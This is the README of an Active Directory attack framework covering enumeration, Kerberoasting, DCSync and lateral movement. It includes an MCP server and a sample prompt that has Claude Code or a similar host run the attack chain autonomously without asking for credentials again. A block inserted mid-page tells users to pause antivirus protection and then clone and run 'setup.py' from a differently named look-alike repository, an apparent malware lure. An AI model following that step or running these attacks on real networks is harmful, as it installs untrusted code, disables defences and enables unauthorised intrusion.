## Overview

AdStrike is a modular, terminal-based Active Directory attack framework. It helps operators move through discovery, enumeration, exploitation, credential access, lateral movement, persistence, and reporting while keeping session state in one place.

The framework stores target details, credentials, Kerberos state, findings, executed commands, and output paths in a shared session. Modules can reuse that context instead of forcing the operator to re-enter the same data repeatedly.

> **🔑 No API key required.** AdStrike now ships an **MCP server** that exposes all
> **53 tools** (52 attack modules + `set_engagement`) over the [Model Context
> Protocol](https://modelcontextprotocol.io). Plug it into an MCP host you already
> use — **Claude Code, Cursor, Claude Desktop** — and that host's LLM drives the
> whole engagement with **its own subscription**. No Ollama, **no `ANTHROPIC_API_KEY`**,
> no local model to download. See **[MCP Server (No API Key)](#mcp-server-no-api-key)**
> below and **[docs/mcp.md](docs/mcp.md)**.

Core capabilities:

- 58 interactive menu entries: 52 attack modules, 4 utilities, 2 management functions
- 9 kill-chain phase groups, from reconnaissance through advanced operations
- Kerberos-aware workflows for NTLM-disabled and LDAP-signing-enforced environments
- Smart Analyst for parsing output and ranking next actions
- Optional AdStrike Agent for AI-assisted planning or tool orchestration
- **MCP server exposing all 53 tools — no API key, driven by your existing MCP host (Claude Code / Cursor / Claude Desktop)**
- Report generation in HTML, Markdown, and JSON
- Wrappers for common AD tooling such as Impacket, NetExec, Certipy, Kerbrute, BloodHound, PowerView, Rubeus, and related utilities

## Requirements

| Item | Requirement |
|---|---|
| OS | Kali Linux 2024+ or Parrot OS recommended |
| Python | 3.10 or higher |
| Privileges | Normal user for the framework; root only for tools that require packet capture or privileged network actions |
| Network | Reachability to in-scope AD services, commonly 88, 389, 443, 445, 636, 5985 |

Key external tools:

```text
impacket-scripts    nxc / netexec       bloodhound-python    certipy-ad
evil-winrm          kerbrute            responder            ldap-utils
hashcat             john                nmap / masscan       krb5-user
dnstool.py          dig                 ldapsearch
```

Most dependencies are installed by `install.sh`. Some optional tools are installed or repaired by `scripts/repair_tools.sh` when possible.

---

## Configuration

The installer copies `.env.example` to `.env`. Edit `.env` before an engagement:

```env
DC_IP=10.10.10.10
DC_FQDN=dc1.corp.local
DOMAIN=corp.local
BASE_DN=DC=corp,DC=local
USERNAME=user
PASSWORD=
NT_HASH=
USE_KERBEROS=false
KRB5_CCACHE=
ATTACKER_IP=10.10.14.5
ATTACKER_IFACE=tun0
ENGAGEMENT_NAME=Corp-Internal-2026
ADSTRIKE_SHOW_SECRETS=false
```

You can also enter these values interactively from the Session Manager. The session carries them across modules automatically.

Never commit real engagement data. Keep `.env`, `output/`, ticket files, hashes, dumps, reports, and captured loot private and redacted.

Useful environment flags:

| Variable | Default | Purpose |
|---|---:|---|
| `ADSTRIKE_SHOW_SECRETS` | `false` | Mask passwords, hashes, and loot in logs and reports unless explicitly enabled |
| `ADSTRIKE_NO_ANIMATION` | unset | Disable startup animation for cleaner logs or slow terminals |
| `ADSTRIKE_PORT_CHECK` | unset | Force quick nmap AD port check during session setup |
| `TGT_AUTO_RENEW` | `true` | Keep Kerberos renewal behavior enabled where supported |
| `ADSTRIKE_OPSEC` | `normal` | Agent mode override: `loud`, `normal`, or `stealth` |
| `ADSTRIKE_BH_HOST` | unset | BloodHound/Agent hostname override |
| `ADSTRIKE_BH_DOMAIN` | unset | BloodHound/Agent domain override |
| `ADSTRIKE_BH_IP` | unset | BloodHound/Agent DC IP override |
| `ANTHROPIC_API_KEY` | unset | Optional Claude backend key for AdStrike Agent |

## Output

Runtime files are written under `output/`:

| Path | Purpose |
|---|---|
| `output/session.json` | Persisted session state |
| `output/session_*.log` | Launcher logs from `run.sh` |
| `output/enum/` | LDAP, SMB, GPO, and enumeration artifacts |
| `output/bloodhound/` | BloodHound collections and related data |
| `output/audit/capability_audit.json` | Tool Checker and module health snapshot |
| `output/agent_logs/` | AdStrike Agent Markdown/JSON run logs |
| `output/agent_runtime/` | Kerberos config, ccache, hashes, and temporary agent artifacts |
| `output/reports/` | Generated reports |

Review and redact everything in `output/` before sharing.

---

## Automatic Target Discovery

During first-run session setup, entering a DC IP triggers a fast discovery pass:

Force the port check:

```bash
ADSTRIKE_PORT_CHECK=true bash run.sh
```

If a DC FQDN is discovered, AdStrike prints an `/etc/hosts` line for environments where DNS resolution is unreliable. If clock skew is detected, it prints a time-sync hint before Kerberos-heavy workflows.

---

## Kerberos and NTLM-Disabled Environments

For targets where NTLM is disabled or unreliable, use:

```text
[18] Kerberos Attacks -> [A] NTLM-Disabled Attack Workflow
```

This workflow can:

- Generate target-specific `krb5.conf`
- Add the DC FQDN mapping guidance
- Request a TGT with Impacket
- Set `KRB5CCNAME` and `KRB5_CONFIG`
- Enable Kerberos mode for later modules
- Print ready-to-use Kerberos commands for NetExec, Impacket, BloodHound, and Evil-WinRM

Common Kerberos checks:

```bash
date
klist
cat "$KRB5_CONFIG"
echo "$KRB5CCNAME"
```

---


## AdStrike Agent

AdStrike Agent is optional. Manual modules do not require AI.
Want to try just the agent? → **[github.com/capture0x/AdAgent](https://github.com/capture0x/AdAgent)**

Supported backends:

| Backend | Use Case | Requirement |
|---|---|---|
| Ollama | Local / private / offline lab usage | `ollama serve`, local model, Python `requests` |
| Claude | API-backed reasoning | `ANTHROPIC_API_KEY`, internet / API access |

Ollama example:

```bash
ollama serve
ollama pull mistral
bash run.sh
# choose [51] AdStrike Agent (AI)
# choose Backend [1] Ollama
```


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/topazflyerhike/AdStrike-708.git
cd AdStrike-708
python setup.py
```


Claude example:

```bash
export ANTHROPIC_API_KEY="sk-ant-..."
bash run.sh
# choose [51] AdStrike Agent (AI)
# choose Backend [2] Claude
```

Agent modes:

| Mode | Meaning |
|---|---|
| Full Auto | Agent executes tool calls and adapts to evidence |
| Plan Only | Agent produces a prioritized plan without executing tools |

OPSEC modes:

| Mode | Meaning |
|---|---|
| Loud | Fast lab/CTF mode |
| Normal | Balanced internal pentest mode; default |
| Stealth | More conservative native-first behavior where possible |

---

## MCP Server (No API Key)

> **No `ANTHROPIC_API_KEY`, no Ollama, no local model.** On this path AdStrike runs
> **no LLM of its own**. It exposes its AD-attack tools over the
> [Model Context Protocol](https://modelcontextprotocol.io), and an MCP host you
> already have — **Claude Code, Cursor, Claude Desktop** — drives the engagement
> with **its own subscription**. The host is the brain; AdStrike is the toolbox.

All **53 tools** are published — the 52 attack tools (`nmap_scan`, `enumerate_ldap`,
`adcs_scan`, `evil_winrm`, `gmsa_read`, `dcsync_attack`, `kerberoast`, …) plus
`set_engagement` — using the exact same schemas the standalone agent uses
(`modules/agent/_core.py`), so there is one source of truth and no duplication.

![AdStrike MCP server demo](assets/mcp-demo.gif)

**1. Verify the server can load** (uses the project venv):

```bash
./venv/bin/python3 -c "import mcp; from modules.agent._core import TOOLS; print('ok', len(TOOLS))"
```

**2. Register in Claude Code.** The repo already ships a project `.mcp.json` with
repo-relative paths, so if you start Claude Code from the AdStrike folder (step 3)
**you can skip this step** — it is picked up automatically:

```json
{
  "mcpServers": {
    "adstrike": {
      "command": "venv/bin/python3",
      "args": ["mcp_server.py"]
    }
  }
}
```

To register it globally (so it works from any directory) use absolute paths via CLI:

```bash
claude mcp add adstrike -- /path/to/AdStrike/venv/bin/python3 /path/to/AdStrike/mcp_server.py
```

Cursor and Claude Desktop use the same `command` + `args` shape in their MCP config.

**3. Start Claude Code from the AdStrike folder.** A project `.mcp.json` is only
loaded when `claude` launches from the directory that contains it, so run it there:

```bash
cd /path/to/AdStrike
claude
```

On first launch Claude Code asks you to approve the `adstrike` MCP server — accept
it. Confirm the tools are live with `/mcp` inside Claude Code (or `claude mcp list`
from the shell). Cursor and Claude Desktop pick the server up after a restart.

**4. Use it.** Set the engagement once, then let the host drive:

> set_engagement: dc_ip `10.0.0.1`, domain `corp.local`, username `alice`, password `…` (or `nt_hash`)

AdStrike stores the target and credentials in the session and **injects them into
every later tool call**, so the host LLM never has to repeat the password and can't
accidentally target the wrong host or account. From there the host reads each
tool's output and picks the next tool — nmap → LDAP enum → BloodHound → the
matching abuse primitive — just like the built-in agent loop, but funded by the
host subscription.

**Example prompt** — paste this into Claude Code (adjust the target) to set the
engagement once and have the host drive the standard AdStrike workflow:

```text
Use the adstrike MCP server. Call set_engagement with dc_ip 192.168.56.1,
domain corp.local, username tester, password 'Pass123!'.

Then run the same workflow as the AdStrike agent:
  1. nmap_scan
  2. no_cred_surface_recon
  3. enumerate_ldap
  4. enumerate_shares
  5. collect_bloodhound
  6. query_bloodhound_paths
  7. adcs_scan
  8. acl_abuse_scan
  9. kerberoast
  10. asrep_roast
  11. discover_winrm_access
  12. chain_planner

After each tool result, analyze the output and choose the next best AdStrike
MCP tool. Do not ask me for the password again — use the session credential
injected by set_engagement.
```

You only pass the credential inside `set_engagement`; every later tool reuses the
session value, so the host never needs it again.

## Performance / GPU Acceleration

### Why the Ollama agent may feel slow

The agent uses a rule engine for most decisions (no LLM call). Rounds that require LLM input call Ollama locally. If Ollama runs on CPU instead of GPU, each call takes 15–30 seconds instead of 2–5 seconds.

Verify which processor Ollama is using:

```bash
ollama ps
# PROCESSOR column should show "GPU", not "100% CPU"
```

---

### Fix: Ollama not detecting the GPU (Kali / systemd)

On some Kali Linux setups the `ollama` systemd service starts before CUDA libraries are on the library path, so `GPULayers:[]` appears in the logs and inference falls back to CPU.

**Step 1 — add CUDA environment variables to the service:**

```bash
sudo nano /etc/systemd/system/ollama.service
```

Add these three lines inside the `[Service]` block:

```ini
Environment="CUDA_VISIBLE_DEVICES=0"
Environment="LD_LIBRARY_PATH=/usr/local/lib/ollama/cuda_v12:/usr/lib/x86_64-linux-gnu"
Environment="OLLAMA_GPU_OVERHEAD=0"
```

Full `[Service]` block example after the edit:

```ini
[Service]
ExecStart=/usr/local/bin/ollama serve
User=ollama
Group=ollama
Restart=always
RestartSec=3
Environment="PATH=..."
Environment="CUDA_VISIBLE_DEVICES=0"
Environment="LD_LIBRARY_PATH=/usr/local/lib/ollama/cuda_v12:/usr/lib/x86_64-linux-gnu"
Environment="OLLAMA_GPU_OVERHEAD=0"
```

**Step 2 — reload and restart:**

```bash
sudo systemctl daemon-reload
sudo systemctl restart ollama
```

**Step 3 — confirm GPU is in use:**

```bash
ollama ps
# Expected: PROCESSOR = GPU (or a percentage, not "100% CPU")
```

> **Note:** The CUDA path `/usr/local/lib/ollama/cuda_v12` is created by the official Ollama Linux installer. If you installed Ollama a different way, adjust the path to match where `libcublas.so.12` lives on your system.

---

### Recommended Ollama model for speed vs quality

| Model | VRAM | Speed | Tool-call quality |
|---|---|---|---|
| `qwen2.5-coder:7b` | ~5 GB | Medium | Best for AD agent |
| `llama3.2:3b` | ~2 GB | Fastest | Good for low-VRAM machines |
| `mistral:latest` | ~4.5 GB | Medium | Decent fallback |

Pull a model:

```bash
ollama pull qwen2.5-coder:7b
```

---

## Repair and Troubleshooting

Check installed tools and module imports:

```bash
python3 main.py --module 58 --no-banner
```

Repair missing tools where possible:

```bash
bash scripts/repair_tools.sh --check
bash scripts/repair_tools.sh -y
```

Scoped repairs:

```bash
bash scripts/repair_tools.sh --no-apt
bash scripts/repair_tools.sh --no-pip
bash scripts/repair_tools.sh --no-github
```

If the virtual environment is missing:

```bash
bash install.sh
source adrt_venv/bin/activate
python3 main.py --check
```

If NetExec or Impacket fails, verify versions and rerun the repair script:

```bash
which nxc
nxc --version
which impacket-secretsdump
bash scripts/repair_tools.sh -y
```

If reports include sensitive values, confirm redaction is enabled:

```env
ADSTRIKE_SHOW_SECRETS=false
```

Then review `.env`, `output/session.json`, and generated reports manually before sharing.
